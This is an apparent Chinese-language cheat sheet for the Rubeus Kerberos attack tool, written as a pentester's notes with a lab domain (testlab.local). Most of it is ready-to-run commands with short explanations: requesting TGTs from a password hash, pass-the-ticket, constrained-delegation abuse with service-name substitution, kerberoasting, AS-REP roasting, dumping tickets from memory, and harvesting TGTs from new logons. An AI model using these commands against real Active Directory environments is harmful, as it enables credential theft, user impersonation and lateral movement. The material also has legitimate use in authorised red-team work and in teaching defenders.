理论部分参考[这篇文章](https://www.anquanke.com/post/id/161781)

# base64转成票据（PS操作）

```
[IO.File]::WriteAllBytes("C:\Users\Administrator\desktop\nlamb.kirbi", [Convert]::FromBase64String("doIFZzC..."))
```


# asktgt

## 根据哈希请求票据

可以是rc4_hmac (/rc4) 或者 aes256_cts_hmac_sha1 (/aes256) hash

```
Rubeus.exe asktgt /user:dfm.a /rc4:2b576acbe6bcfda7294d6bd18041b8fe /ptt
```


## renew

大多数域默认的 Kerberos 策略为 TGT 提供10小时的生命期，并具有7天的续订窗口.

如果你有一个在10小时的有效生命期内的 .kirbi 文件（或者对应的Rubeus base64 blob），并且还在7天的续订窗口期内，就可以使用 Kekeo 或者 Rubeus 来续订 TGT ，从而重启10个小时的窗口期，延长票据的有效生命期

```
Rubeus.exe renew /ticket:doIFmjCC...(snip)...
```

如果你想要票据在到达续订窗口之前能够自动续订，只需使用 /autorenew 参数

```
Rubeus.exe renew /ticket:doIFFj...(snip)... /autorenew
```


# s4u

滥用此 TTP 的方法，首先需要配置了限制委派的账户的有效 TGT/KRB-CRED 文件。使用此账户的 NTML/RC4 或 aes256_cts_hmac_sha1 哈希，利用 asktgt 功能即可获取这个文件。然后在 s4u 操作中，使用 /ticket 参数指定此票据文件（base64编码的blob 或者是磁盘上的一个票据文件），以及必需的 /impersonateuser:X 参数来指定要仿冒的账户， /msdsspn:SERVICE/SERVER 参数来指定账户的 msds-allowedToDelegateTo 字段中配置的 SPN 。而 /dc 和 /ptt 参数的功能与之前的操作相同


## /altservice

**/altservice** 参数利用了 Alberto Solino‘s 的伟大发现，即 服务名称在KRB-CRED文件中不被保护 ，只有服务器名称才被保护。这就允许我们在生成的KRB-CRED（.kirbi）文件中替换我们想要的任何服务名称

这里原本只委托了ldap服务，使用/altservice参数改成cifs服务，仿冒用户```dfm.a```的权限

```
Rubeus.exe s4u /ticket:C:TempTicketspatsy.kirbi /impersonateuser:dfm.a /msdsspn:ldap/primary.testlab.local /altservice:cifs /ptt
```

# ptt
```
Rubeus.exe ptt /ticket:doIFmj...(snip)...
```


# purge

清除所有登录会话

```
Rubeus.exe purge
```


# describe

想了解一个特定的 .kirbi Kerberos 票据的详细信息。describe 操作使用 /ticket:X 参数（TGT或服务票据）

```
Rubeus.exe describe /ticket:doIFmjCC...(snip)...
```

# createnetonly
createnetonly 操作使用 CreateProcessWithLogonW() API 创建一个新的隐藏（除非指定了 /show 参数）进程，其SECURITY_LOGON_TYPE 是9（新建票据），相当于runas /netonly操作，返回这个进程的 ID 和 LUID （登录会话ID）。然后，就可以使用 ptt /luid:X 参数将指定的 Kerberos 票据应用于此进程，前提是已提升了权限。这样就可以防止清除当前登录会话的现有TGT

```
Rubeus.exe createnetonly /program:"C:WindowsSystem32cmd.exe"
```

# Kerberoast

kerberoast 操作实现了 SharpRoast 项目的功能

/spn:X 参数可针对指定的SPN 进行操作，/user:X 参数可针对指定的用户进行操作，/ou:X 参数可针对指定的 OU 中的用户进行操作。如果要使用备用域凭据进行 kerberoasing，可以使用 /creduser:DOMAIN.FQDNUSER /credpassword:PASSWORD 参数来指定

```
>Rubeus.exe kerberoast /ou:OU=TestingOU,DC=testlab,DC=local
```


# asreproast

asreproast 操作和 ASREPRoast 项目的功能一致

如果一个用户没有启用 kerberos 预身份认证，则可以为此用户成功请求 AS-REP，而此结构的一个组件可以被离线破解，也就是 kerberoasting

/user:X 参数是必需的，而 /domain 和 /dc 参数是可选的。如果 /domain 和 /dc 参数没有被指定，则 Rubeus 将和其他操作一样，获取系统的默认值

```
Rubeus.exe asreproast /user:dfm.a
```

# dump

在已经管理员权限的情况下，dump 操作将从内存中提取当前的 TGT 和服务票据。可以使用 /service （使用 /service:krbtgt 来指定 TGT 票据）和 / 或 登录 ID （ luid:X 参数）来指定要提取的票据类型。操作将返回base64编码的blob 数据，并保存为KRB-CRED 文件（.kirbis）。此文件可被用于 ptt 操作，Mimikatz的 kerberos::ptt 功能，或者 Cobalt Strike 的 kerberos_ticket_use 操作

```
Rubeus.exe dump /service:krbtgt /luid:366300
```

# monitor
**注意此操作需要运行于管理员权限！**

monitor 操作将监视 4624 登录事件，并提取新登录 ID(LUID)的任意 TGT 票据。、interval 参数（以秒为单位，默认为60）来指定检查事件日志的频率。/filteruser:X 参数用于指定只返回特定用户的票据。此功能在没有设置约束委派的服务器上特别有用。当 /fiteruser 指定的用户（如果未指定，则任何用户）创建一个新的4624登录事件时，将输出所有提取到的 TGT KRB-CRED 数据

```
Rubeus.exe monitor /filteruser:dfm.a
```


# harvest

**注意此操作需要运行于管理员权限！**

harvest 操作比 monitor 操作更进一步。它将持续地监视登陆日志中的4624事件，每间隔 /interval:MIMUTES 指定的时间，就针对新的登录事件，进行新的 TGT KRB-CRED 文件的提取，并将提取的 TGT 进行缓存。在 /interval 指定的时间间隔内，任何将在下一个时间间隔到期的 TGT 都将被自动续订（直到他们的续订期限），并且当前缓存的可用 / 有效的 TGT KRB-CRED .kirbis 文件将以 base64 编码的 blob 数据格式输出

```
Rubeus.exe harvest /interval:30
```